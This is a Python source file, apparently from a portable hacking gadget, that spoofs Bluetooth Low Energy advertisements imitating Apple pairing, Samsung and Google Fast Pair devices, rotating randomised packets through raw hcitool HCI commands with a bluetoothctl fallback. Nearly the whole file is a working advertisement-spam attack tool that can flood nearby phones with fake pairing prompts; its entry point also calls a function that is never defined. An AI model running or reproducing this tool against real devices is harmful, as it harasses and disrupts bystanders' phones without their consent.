#!/usr/bin/env python3
# tools/bt/bt_spoofing.py
# spoofing alternado Apple / Samsung / Google vía HCI (hcitool cmd).

import subprocess
import time
import os
import random
from display.screen import MenuDisplay
from config.gpio_config import read_buttons

# --- Helpers HCI / utilidades -------------------------------------------------
def has_command(cmd):
    return subprocess.call(["which", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def run_cmd(cmd):
    """Run command list, return (retcode, stdout+stderr)."""
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, check=False)
        return proc.returncode, proc.stdout
    except Exception as e:
        return 1, str(e)

def bytes_to_hex_tokens(bts):
    """Convierte iterable de enteros a tokens hex ('1e', 'ff', ...)"""
    return ["{0:02x}".format(b) for b in bts]

def set_advertising_data_hci(data_bytes):
    
    if not has_command("hcitool"):
        return False, "hcitool not found"

    # asegurarse interfaz arriba
    run_cmd(["sudo", "hciconfig", "hci0", "up"])

    length = len(data_bytes)
    if length > 31:
        return False, "Advertising data too long (>31 bytes)"

    payload = [length] + list(data_bytes)
    tokens = bytes_to_hex_tokens(payload)
    cmd = ["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008"] + tokens
    rc, out = run_cmd(cmd)
    if rc != 0:
        return False, f"LE Set Adv Data failed: {out}"

    # Enable advertising (LE Set Advertise Enable) OCF=0x000A
    rc2, out2 = run_cmd(["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"])
    if rc2 != 0:
        return False, f"Enable adv failed: {out2}"

    return True, out + out2

def disable_advertising_hci():
    if not has_command("hcitool"):
        return False, "hcitool not found"
    run_cmd(["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00"])
    return True, "disabled"

# --- Definiciones de paquetes (basadas en el C++) -----------------------------
# Apple (ejemplo, 31 bytes)
APPLE_DEV_0 = [
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75,
    0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]

# Samsung template (15 bytes) - company id 0x0075 (little endian 0x75 0x00)
SAMSUNG_TEMPLATE = [14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00]

# Google Fast Pair template (14 bytes, service data)
GOOGLE_TEMPLATE = [
    0x03, 0x03, 0x2C, 0xFE,   # Complete 16-bit Service UUIDs (FE2C)
    0x06, 0x16, 0x2C, 0xFE,   # Service Data (FE2C) length...
    0x00, 0xB7, 0x27,         # example service data bytes
    0x02, 0x0A, 0x00          # TX Power placeholder
]

def build_apple_packet():
    # Tomamos la plantilla y variamos un byte (simula action type/random)
    pkt = APPLE_DEV_0.copy()
    # Cambiamos el byte 7 (index 7 en C++) por un valor aleatorio de ejemplo
    pkt[7] = random.choice([0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14])
    # Espacios aleatorios para simular tag (take last 3 bytes random)
    pkt[-3:] = [random.getrandbits(8) for _ in range(3)]
    return pkt

def build_samsung_packet():
    pkt = SAMSUNG_TEMPLATE.copy()
    # último byte: modelo (01/02/03) — elegir aleatorio
    pkt[-1] = random.choice([0x01, 0x02, 0x03])
    return pkt

def build_google_packet():
    pkt = GOOGLE_TEMPLATE.copy()
    # último byte TX power: -100..20 -> store as unsigned byte representation
    tx = random.randint(-100, 20) & 0xff
    pkt[-1] = tx
    return pkt


def run_bt_spoofing(name=None, mac=None, rssi=None):
   
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    bt_reports = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/bt"))
    os.makedirs(bt_reports, exist_ok=True)
    logfile = os.path.join(bt_reports, f"advertise_{timestamp}.log")

    adv_name = name or "Airpods Pro"  # nombre friendly mostrado

    display.show_message(["Inicializando HCI", adv_name], center=True)
    time.sleep(0.8)

    use_hci = has_command("hcitool") and has_command("hciconfig")
    if not use_hci:
        display.show_message(["hcitool no encontrado", "Usando bluetoothctl fallback"], center=True)
        time.sleep(1.5)

    display.show_message([f"Spoofing:", adv_name, "", "ENTER: Stop"], center=False)
    time.sleep(1)

    start = time.time()
    duration_total = 60 #segundos totales
    with open(logfile, "w") as logf:
        try:
            idx = 0
            while True:
                elapsed = int(time.time() - start)
                remaining = max(0, duration_total - elapsed)
                logf.write(time.strftime("[%H:%M:%S] Loop: ") + f"elapsed={elapsed} remaining={remaining}\n")

                # Lectura botones
                buttons = read_buttons()
                if buttons.get("enter", False) or remaining <= 0:
                    break

                # Alternamos los formatos cada ciclo
                fmt = idx % 3
                if fmt == 0:
                    payload = build_apple_packet()
                    label = "APPLE"
                elif fmt == 1:
                    payload = build_samsung_packet()
                    label = "SAMSUNG"
                else:
                    payload = build_google_packet()
                    label = "GOOGLE FastPair"

                # Try HCI if available
                success = False
                if use_hci:
                    ok, out = set_advertising_data_hci(payload)
                    if ok:
                        success = True
                        logf.write(f"[{time.strftime('%H:%M:%S')}] Advertise HCI {label} OK\n")
                        display.show_message([f"Spoofing: {adv_name}", f"{label}", f"Left: {remaining}s"], center=False)
                        # transmitir un par de segundos
                        time.sleep(2)
                        disable_advertising_hci()
                    else:
                        logf.write(f"[{time.strftime('%H:%M:%S')}] HCI Error: {out}\n")
                        display.show_message(["HCI Err:", out.splitlines()[0][:20]], center=False)
                        time.sleep(1)

                # Fallback a bluetoothctl si HCI no funcionó
                if not success:
                    # mínimo fallback: set alias y advertise on por bluetoothctl
                    proc = subprocess.Popen(
                        ["sudo", "bluetoothctl"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        bufsize=1
                    )
                    cmds = [
                        "power on",
                        f"system-alias {adv_name}",
                        "agent on",
                        "default-agent",
                        "discoverable on",
                        "pairable on",
                        "advertise on"
                    ]
                    for c in cmds:
                        proc.stdin.write(c + "\n")
                        proc.stdin.flush()
                        time.sleep(0.6)
                    display.show_message([f"Spoofing(btctl): {label}", f"Left: {remaining}s"], center=False)
                    time.sleep(2)
                    proc.stdin.write("advertise off\n")
                    proc.stdin.write("discoverable off\n")
                    proc.stdin.write("exit\n")
                    proc.stdin.flush()
                    proc.terminate()

                idx += 1
                # short pause antes del siguiente formato
                time.sleep(0.2)

        except KeyboardInterrupt:
            pass
        finally:
            # asegurar que advertising se apague
            if use_hci:
                disable_advertising_hci()
            else:
                # attempt to stop via bluetoothctl
                run_cmd(["sudo", "bluetoothctl", "advertise", "off"])
                run_cmd(["sudo", "bluetoothctl", "discoverable", "off"])

    display.show_message(["   Spoofing BT   ", "   detenido   "], center=True)
    time.sleep(1.5)


if __name__ == "__main__":
    run_bt_advertise()

